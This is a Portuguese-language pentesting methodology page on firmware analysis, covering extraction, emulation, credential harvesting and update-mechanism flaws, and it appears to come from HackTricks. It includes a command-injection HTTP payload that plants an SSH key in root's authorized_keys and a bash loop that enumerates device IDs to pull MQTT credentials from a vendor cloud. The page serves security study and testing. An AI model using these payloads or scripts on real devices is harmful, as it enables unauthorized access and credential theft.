# Análise de Firmware

{{#include ../../banners/hacktricks-training.md}}

## **Introdução**

### Recursos relacionados


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware é software essencial que permite que dispositivos operem corretamente, gerenciando e facilitando a comunicação entre os componentes de hardware e o software com o qual os usuários interagem. Ele é armazenado em memória permanente, garantindo que o dispositivo possa acessar instruções vitais desde o momento em que é ligado, levando ao carregamento do sistema operacional. Examinar e, potencialmente, modificar o firmware é uma etapa crítica para identificar vulnerabilidades de segurança.

## **Coleta de informações**

**Coleta de informações** é uma etapa inicial crítica para entender a composição de um dispositivo e as tecnologias que ele usa. Esse processo envolve coletar dados sobre:

- A arquitetura da CPU e o sistema operacional que ela executa
- Detalhes do bootloader
- Layout do hardware e datasheets
- Métricas da base de código e locais do código-fonte
- Bibliotecas externas e tipos de licença
- Histórico de atualizações e certificações regulatórias
- Diagramas arquiteturais e de fluxo
- Avaliações de segurança e vulnerabilidades identificadas

Para esse propósito, ferramentas de **open-source intelligence (OSINT)** são inestimáveis, assim como a análise de quaisquer componentes de software open-source disponíveis por meio de processos de revisão manual e automatizada. Ferramentas como [Coverity Scan](https://scan.coverity.com) e [Semmle’s LGTM](https://lgtm.com/#explore) oferecem análise estática gratuita que pode ser aproveitada para encontrar possíveis problemas.

## **Obtendo o Firmware**

A obtenção do firmware pode ser feita por vários meios, cada um com seu próprio nível de complexidade:

- **Diretamente** da fonte (desenvolvedores, fabricantes)
- **Compilando** a partir das instruções fornecidas
- **Baixando** de sites oficiais de suporte
- Utilizando consultas **Google dork** para encontrar arquivos de firmware hospedados
- Acessando o **cloud storage** diretamente, com ferramentas como [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Interceptando **updates** por meio de técnicas man-in-the-middle
- **Extraindo** do dispositivo por meio de conexões como **UART**, **JTAG** ou **PICit**
- **Sniffing** de solicitações de atualização dentro da comunicação do dispositivo
- Identificando e usando endpoints de atualização **hardcoded**
- **Dumping** a partir do bootloader ou da rede
- **Removendo e lendo** o chip de armazenamento, quando tudo mais falhar, usando ferramentas de hardware apropriadas

### Logs apenas via UART: forçar um root shell via env do U-Boot na flash

Se o UART RX for ignorado (apenas logs), ainda é possível forçar um init shell editando o blob do ambiente do U-Boot offline:

1. Faça o dump da flash SPI com um clip SOIC-8 + programador (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Localize a partição do env do U-Boot, edite `bootargs` para incluir `init=/bin/sh`, e **recalcule o CRC32 do env do U-Boot** para o blob.
3. Regrave apenas a partição env e reinicie; um shell deverá aparecer na UART.

Isso é útil em dispositivos embedded onde o shell do bootloader está desativado, mas a partição env é gravável via acesso externo à flash.

## Analisando o firmware

Agora que você **tem o firmware**, precisa extrair informações sobre ele para saber como tratá-lo. Diferentes ferramentas que você pode usar para isso:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Se você não encontrar muito com essas tools, verifique a **entropy** da imagem com `binwalk -E <bin>`; se for baixa, então provavelmente não está encrypted. Se for alta, provavelmente está encrypted (ou compressed de alguma forma).

Além disso, você pode usar estas tools para extrair **files embedded inside the firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ou [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) para inspecionar o file.

### Getting the Filesystem

Com as tools comentadas anteriormente, como `binwalk -ev <bin>`, você já deveria ter conseguido **extrair o filesystem**.\
O Binwalk normalmente o extrai dentro de uma **folder named as the filesystem type**, que geralmente é uma destas: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manual Filesystem Extraction

Às vezes, o binwalk **não terá o magic byte do filesystem em suas signatures**. Nesses casos, use o binwalk para **encontrar o offset do filesystem e carve o compressed filesystem** do binary e **extract manualmente** o filesystem de acordo com seu type usando os passos abaixo.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Execute o seguinte **dd command** para extrair o filesystem Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativamente, o seguinte comando também pode ser executado.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Para squashfs (usado no exemplo acima)

`$ unsquashfs dir.squashfs`

Os arquivos estarão depois no diretório "`squashfs-root`".

- Arquivos de archive CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Para filesystems jffs2

`$ jefferson rootfsfile.jffs2`

- Para filesystems ubifs com NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analisando Firmware

Uma vez obtido o firmware, é essencial dissecá-lo para entender sua estrutura e possíveis vulnerabilidades. Esse processo envolve utilizar várias tools para analisar e extrair dados valiosos da imagem do firmware.

### Initial Analysis Tools

Um conjunto de commands é fornecido para a inspeção inicial do arquivo binário (referido como `<bin>`). Esses commands ajudam a identificar file types, extrair strings, analisar binary data e entender os detalhes da partition e do filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Para avaliar o status de criptografia da imagem, a **entropy** é verificada com `binwalk -E <bin>`. Baixa entropy sugere ausência de criptografia, enquanto alta entropy indica possível criptografia ou compression.

Para extrair **embedded files**, ferramentas e recursos como a documentação **file-data-carving-recovery-tools** e **binvis.io** para inspeção de arquivos são recomendados.

### Extracting the Filesystem

Usando `binwalk -ev <bin>`, normalmente é possível extrair o filesystem, geralmente para um diretório nomeado após o tipo de filesystem (por exemplo, squashfs, ubifs). No entanto, quando o **binwalk** falha em reconhecer o tipo de filesystem devido à ausência de magic bytes, a extração manual é necessária. Isso envolve usar `binwalk` para localizar o offset do filesystem, seguido do comando `dd` para carve out o filesystem:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Depois, dependendo do tipo de filesystem (por exemplo, squashfs, cpio, jffs2, ubifs), diferentes comandos são usados para extrair manualmente o conteúdo.

### Filesystem Analysis

Com o filesystem extraído, começa a busca por falhas de segurança. A atenção é voltada para network daemons inseguros, credenciais hardcoded, API endpoints, funcionalidades de update server, código não compilado, startup scripts e binaries compilados para análise offline.

**Locais principais** e **itens** para inspecionar incluem:

- **etc/shadow** e **etc/passwd** para credenciais de usuário
- certificados e chaves SSL em **etc/ssl**
- arquivos de configuração e script para possíveis vulnerabilidades
- binaries embedded para análise adicional
- web servers e binaries comuns de dispositivos IoT

Várias ferramentas ajudam a descobrir informações sensíveis e vulnerabilidades dentro do filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) e [**Firmwalker**](https://github.com/craigz28/firmwalker) para busca de informações sensíveis
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) para análise abrangente de firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) e [**EMBA**](https://github.com/e-m-b-a/emba) para análise static e dynamic

### Security Checks on Compiled Binaries

Tanto o source code quanto os compiled binaries encontrados no filesystem devem ser examinados em busca de vulnerabilidades. Ferramentas como **checksec.sh** para binaries Unix e **PESecurity** para binaries Windows ajudam a identificar binaries desprotegidos que podem ser explorados.

## Harvesting cloud config and MQTT credentials via derived URL tokens

Muitos IoT hubs obtêm sua configuração por dispositivo de um cloud endpoint que se parece com:

- `https://<api-host>/pf/<deviceId>/<token>`

Durante a análise de firmware, você pode descobrir que `<token>` é derivado localmente a partir do device ID usando um secret hardcoded, por exemplo:

- token = MD5( deviceId || STATIC_KEY ) e representado como uppercase hex

Esse design permite que qualquer pessoa que descubra um deviceId e a STATIC_KEY reconstrua a URL e obtenha a cloud config, muitas vezes revelando credenciais MQTT em plaintext e prefixes de topic.

Fluxo de trabalho prático:

1) Extraia o deviceId dos UART boot logs

- Conecte um adaptador UART de 3.3V (TX/RX/GND) e capture os logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Procure linhas que imprimam o padrão da URL de configuração da cloud e o endereço do broker, por exemplo:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Recuperar STATIC_KEY e o algoritmo do token a partir do firmware

- Carregue os binários no Ghidra/radare2 e pesquise pelo caminho de config ("/pf/") ou pelo uso de MD5.
- Confirme o algoritmo (ex.: MD5(deviceId||STATIC_KEY)).
- Derive o token no Bash e deixe o digest em uppercase:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Coletar cloud config e credenciais MQTT

- Compose a URL e baixe JSON com curl; faça parsing com jq para extrair secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Abuse MQTT em texto puro e ACLs fracas de tópicos (se presentes)

- Use as credenciais recuperadas para se inscrever em tópicos de manutenção e procurar eventos sensíveis:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerar IDs de dispositivo previsíveis (em escala, com autorização)

- Muitos ecossistemas incorporam bytes de OUI/produto/tipo do fornecedor seguidos por um sufixo sequencial.
- Você pode iterar IDs candidatos, derivar tokens e buscar configs programaticamente:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notas
- Sempre obtenha autorização explícita antes de tentar enumeração em massa.
- Prefira emulação ou análise estática para recuperar secrets sem modificar o hardware-alvo quando possível.


O processo de emular firmware possibilita **dynamic analysis** da operação de um dispositivo ou de um programa individual. Essa abordagem pode encontrar desafios com hardware ou dependências de arquitetura, mas transferir o root filesystem ou binários específicos para um dispositivo com arquitetura e endianness correspondentes, como um Raspberry Pi, ou para uma máquina virtual pré-construída, pode facilitar testes adicionais.

### Emulating Individual Binaries

Para examinar programas únicos, identificar o endianness e a arquitetura de CPU do programa é crucial.

#### Example with MIPS Architecture

Para emular um binário de arquitetura MIPS, pode-se usar o comando:
```bash
file ./squashfs-root/bin/busybox
```
E para instalar as ferramentas de emulação necessárias:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Para MIPS (big-endian), `qemu-mips` é usado, e para binaries little-endian, `qemu-mipsel` seria a escolha.

#### ARM Architecture Emulation

Para ARM binaries, o processo é similar, com o emulator `qemu-arm` sendo utilizado para emulation.

### Full System Emulation

Tools como [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), e outros, facilitam a full firmware emulation, automatizando o processo e auxiliando na dynamic analysis.

## Dynamic Analysis in Practice

Nesta etapa, um ambiente de dispositivo real ou emulado é usado para analysis. É essencial manter shell access ao OS e ao filesystem. A emulation pode não reproduzir perfeitamente as interações de hardware, exigindo reinícios ocasionais da emulation. A analysis deve revisitar o filesystem, explorar webpages expostas e network services, e examinar vulnerabilities no bootloader. Firmware integrity tests são críticos para identificar potenciais backdoor vulnerabilities.

## Runtime Analysis Techniques

Runtime analysis envolve interagir com um process ou binary no seu ambiente de operação, usando tools como gdb-multiarch, Frida e Ghidra para definir breakpoints e identificar vulnerabilities por meio de fuzzing e outras técnicas.

Para embedded targets sem um debugger completo, **copie um `gdbserver` staticamente linkado** para o device e conecte remotamente:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

Em hubs IoT, o stack RF é frequentemente dividido entre uma **radio MCU** e um processo userland Linux. Um workflow útil é mapear o caminho:

1. **RF frame** no ar
2. **controller-side parser** no radio MCU
3. **serial/UART text or TLV protocol** encaminhado para Linux (por exemplo `/dev/tty*`)
4. **application dispatcher** no daemon principal
5. **protocol-specific handler / state machine**

Essa arquitetura cria dois alvos de reversing em vez de um. Se o controller converte RF frames binários em um protocolo textual como `Group,Command,arg1,arg2,...`, recupere:

- Os **message groups** e as dispatch tables
- Quais mensagens podem vir da **network** versus do próprio controller
- Os exatos campos discriminadores **manufacturer-specific** (por exemplo Zigbee `manufacturer_code` e `cluster_command` custom)
- Quais handlers só são alcançáveis durante fases de **commissioning**, discovery ou firmware/model download

Especificamente em Zigbee, capture o tráfego de pairing e verifique se o alvo ainda depende da **Link Key** padrão `ZigBeeAlliance09`. Se sim, sniffing do tráfego de commissioning pode expor a **Network Key**. Zigbee 3.0 install codes reduzem essa exposição, então note se o dispositivo testado realmente os impõe.

### Manufacturer-specific protocol handlers and FSM-gated reachability

Comandos Zigbee/ZCL vendor-specific costumam ser um alvo melhor que clusters padronizados porque alimentam **custom parsing code** e **FSMs** internas com validação menos testada.

Workflow prático:

- Reverse o command dispatcher até encontrar o **vendor-only handler**.
- Recupere as tabelas de **FSM state**, **event**, **check**, **action** e **next-state**.
- Identifique **transitional states** que auto-advance e branches de retry/error que eventualmente resetam ou liberam estado controlado pelo atacante.
- Confirme quais trocas legítimas de protocolo são necessárias para colocar o daemon no estado vulnerável em vez de assumir que o handler buggy é sempre alcançável.

Para protocolos sensíveis a timing, o replay de packets a partir de um Python framework pode ser lento demais. Uma abordagem mais confiável é emular um dispositivo legítimo em hardware real (por exemplo um **nRF52840**) com um stack de nível vendor para expor os **endpoints**, **attributes** e o timing de commissioning corretos.

### Fragmented-download bug class in embedded daemons

Uma classe recorrente de bug de firmware aparece em **fragmented blob/model/configuration downloads**:

1. O **first fragment** (`offset == 0`) armazena `ctx->total_size` e aloca `malloc(total_size)`.
2. Fragmentos posteriores validam apenas campos **packet-local** controlados pelo atacante, como `packet_total_size >= offset + chunk_len`.
3. A cópia usa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sem checar contra o **original allocated size**.

Isso permite que um atacante envie:

- Um primeiro fragmento válido com um declared total size **pequeno** para forçar uma pequena alocação em heap.
- Um fragmento posterior com o **expected offset** mas um `chunk_len` maior.
- Um packet-local size forjado que satisfaça as checagens novas enquanto ainda transborda o buffer originalmente alocado.

Quando o caminho vulnerável fica atrás de lógica de commissioning, a exploração deve incluir **device emulation** suficiente para conduzir o alvo ao estado esperado de model-download ou blob-download antes de enviar os fragments malformados.

### Protocol-driven `free()` triggers

Em embedded daemons, a forma mais fácil de acionar heap metadata exploitation muitas vezes não é "esperar cleanup", mas **forçar o próprio error handling do protocolo**:

- Envie fragments de follow-up malformados para empurrar a FSM para estados de **retry** ou **error**.
- Exceda o threshold de retry para que o daemon **resete o context** e libere o buffer corrompido.
- Use esse `free()` previsível para acionar primitives do allocator antes que o processo trave por razões não relacionadas.

Isso é especialmente útil contra allocators **musl/uClibc/dlmalloc-like** em embedded Linux, onde corromper chunk metadata pode transformar lógica de unlink/unbin em uma write primitive. Um padrão estável é corromper um **size field** para redirecionar a travessia do allocator para **fake chunks staged inside the overflowed buffer**, em vez de sobrescrever imediatamente ponteiros reais de bin e causar crash no processo.

## Binary Exploitation and Proof-of-Concept

Desenvolver um PoC para vulnerabilidades identificadas exige um entendimento profundo da arquitetura alvo e programação em linguagens de nível mais baixo. Proteções em tempo de execução de binários em sistemas embarcados são raras, mas, quando presentes, técnicas como Return Oriented Programming (ROP) podem ser necessárias.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc usa fastbins semelhantes ao glibc. Uma alocação grande posterior pode acionar `__malloc_consolidate()`, então qualquer fake chunk precisa passar nas checagens (size plausível, `fd = 0` e chunks ao redor vistos como "in use").
- **Non-PIE binaries under ASLR:** se ASLR estiver habilitado mas o binário principal for **non-PIE**, os endereços de `.data/.bss` dentro do binário são estáveis. Você pode mirar uma região que já se pareça com um header válido de heap chunk para pousar uma alocação fastbin em uma **function pointer table**.
- **Parser-stopping NUL:** quando JSON é parseado, um `\x00` no payload pode parar o parsing enquanto mantém bytes trailing controlados pelo atacante para um stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** uma ROP chain que chama `open("/proc/self/mem")`, `lseek()` e `write()` pode plantar shellcode executável em um mapping conhecido e saltar para ele.

## Prepared Operating Systems for Firmware Analysis

Sistemas operacionais como [AttifyOS](https://github.com/adi0x90/attifyos) e [EmbedOS](https://github.com/scriptingxss/EmbedOS) fornecem ambientes pré-configurados para firmware security testing, equipados com as ferramentas necessárias.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS é uma distro destinada a ajudar você a realizar security assessment e pentesting de dispositivos Internet of Things (IoT). Ela economiza muito tempo ao fornecer um ambiente pré-configurado com todas as ferramentas necessárias carregadas.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Sistema operacional de embedded security testing baseado em Ubuntu 18.04 com ferramentas de firmware security testing pré-carregadas.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Mesmo quando um vendor implementa checagens de assinatura criptográfica para imagens de firmware, a **proteção contra version rollback (downgrade)** frequentemente é omitida. Quando o boot- ou recovery-loader apenas verifica a assinatura com uma public key embutida, mas não compara a *version* (ou um contador monotônico) da imagem que está sendo flashada, um atacante pode instalar legitimamente um **older, vulnerable firmware that still bears a valid signature** e, assim, reintroduzir vulnerabilidades corrigidas.

Fluxo típico de ataque:

1. **Obter uma older signed image**
* Pegue-a no portal público de downloads do vendor, CDN ou site de suporte.
* Extraia-a de companion mobile/desktop applications (por exemplo, dentro de um Android APK em `assets/firmware/`).
* Recupere-a de repositórios de terceiros como VirusTotal, arquivos da internet, fóruns, etc.
2. **Upload or serve the image to the device** por qualquer canal de update exposto:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Muitos dispositivos consumer IoT expõem endpoints HTTP(S) *unauthenticated* que aceitam blobs de firmware codificados em Base64, fazem o decode server-side e acionam recovery/upgrade.
3. Após o downgrade, explore uma vulnerabilidade que foi corrigida na release mais nova (por exemplo, um filtro de command-injection adicionado depois).
4. Opcionalmente, faça flash da latest image novamente ou desative updates para evitar detecção depois que persistence for obtida.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
No firmware vulnerável (rebaixado), o parâmetro `md5` é concatenado diretamente em um shell command sem sanitização, permitindo a injeção de arbitrary commands (aqui – habilitando root access baseado em SSH key). Versões posteriores do firmware introduziram um filtro básico de caracteres, mas a ausência de downgrade protection torna a correção inútil.

### Extraindo Firmware de Mobile Apps

Muitos vendors agrupam imagens completas de firmware dentro de suas companion mobile applications para que o app possa atualizar o device via Bluetooth/Wi-Fi. Esses pacotes são comumente armazenados sem encryption no APK/APEX em paths como `assets/fw/` ou `res/raw/`. Tools como `apktool`, `ghidra` ou até mesmo `unzip` permitem extrair signed images sem tocar no hardware físico.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Bypass de anti-rollback apenas no updater em designs de slot A/B

Alguns vendors de fato implementam um **ratchet** anti-downgrade, mas apenas dentro da lógica do *updater* (por exemplo, uma rotina UDS sobre CAN, um comando de recovery ou um agente OTA em userspace). Se o **bootloader** depois verifica apenas a assinatura/CRC da imagem e confia na partition table ou nos metadados do slot, a proteção contra rollback ainda pode ser contornada.

Design fraco típico:

- Os metadados do firmware contêm tanto um descritor de versão quanto um **security ratchet** / contador monotônico.
- O updater compara o ratchet da imagem com um valor armazenado em persistent storage e rejeita imagens assinadas mais antigas.
- O bootloader **não** faz parse desse ratchet e verifica apenas header, CRC e signature antes de bootar o slot selecionado.
- A ativação do slot é armazenada separadamente em uma partition table ou em um contador de geração por slot e **não está criptograficamente vinculada** ao digest exato do firmware que foi validado.

Isso cria um primitive de **validate-one-image / boot-another-image** em sistemas com dois slots. Se o attacker consegue fazer o updater marcar o slot B como próximo target de boot usando uma imagem assinada atual, e depois sobrescrever o slot B antes do reboot, o bootloader ainda pode bootar a imagem downgraded porque ele só confia nos metadados do slot já committed.

Padrão comum de abuso:

1. Faça upload de um firmware **current signed** no slot passivo e execute a rotina normal de validação/troca para que o layout marque esse slot como o próximo ativo.
2. **Não reinicie ainda**. Reentre na rotina de preparação/erase do slot na mesma sessão.
3. Abuse de stale boot-state ou de lógica stale de seleção de slot para fazer o updater apagar o **mesmo slot físico** que acabou de ser promovido.
4. Grave um firmware **older but still signed** nesse slot.
5. Ignore a rotina de validação que aplica o ratchet e reinicie diretamente.
6. O bootloader seleciona o slot promovido, verifica apenas signature/integrity e boota a imagem antiga.

Coisas para procurar ao reverter implementações de update A/B:

- Seleção de slot derivada de **boot-time flags** que não são atualizadas após uma troca bem-sucedida.
- Uma rotina no estilo `prepare_passive_slot()` que apaga um slot com base em estado stale em vez do **current committed layout**.
- Uma função no estilo `part_write_layout()` que apenas incrementa um **generation counter** / active flag e não armazena o hash da imagem validada.
- Checagens de ratchet implementadas em userspace ou no código do updater, mas **não** em ROM / bootloader / secure boot stages.
- Rotinas de erase ou recovery que deixam o slot marcado como bootable mesmo depois de seu conteúdo ter sido removido e regravado.

### Checklist para Avaliar a Lógica de Update

* O transporte/autenticação do *update endpoint* está adequadamente protegido (TLS + authentication)?
* O device compara **version numbers** ou um **monotonic anti-rollback counter** antes de fazer flash?
* A imagem é verificada dentro de uma secure boot chain (por exemplo, signatures verificadas por código ROM)?
* O **bootloader impõe o mesmo ratchet** que o updater, em vez de verificar apenas signature/CRC?
* Os metadados de ativação do slot estão **vinculados ao validated firmware digest/version**, ou um slot pode ser modificado depois da promoção?
* Depois que a troca de slot é bem-sucedida, o device é forçado a reiniciar ou rotinas posteriores de update/erase ainda são acessíveis na mesma sessão?
* O código em userland faz checagens extras de sanity (por exemplo, partition map permitida, model number)?
* Fluxos de update *partial* ou *backup* reaproveitam a mesma lógica de validação?

> 💡  Se algum dos itens acima estiver ausente, a plataforma provavelmente está vulnerável a rollback attacks.

## Firmware vulnerável para praticar

Para praticar a descoberta de vulnerabilities em firmware, use os seguintes projetos de firmware vulneráveis como ponto de partida.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Trainning and Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Synacktiv - Exploiting the Tesla Wall Connector from its charge port connector - Part 2: bypassing the anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
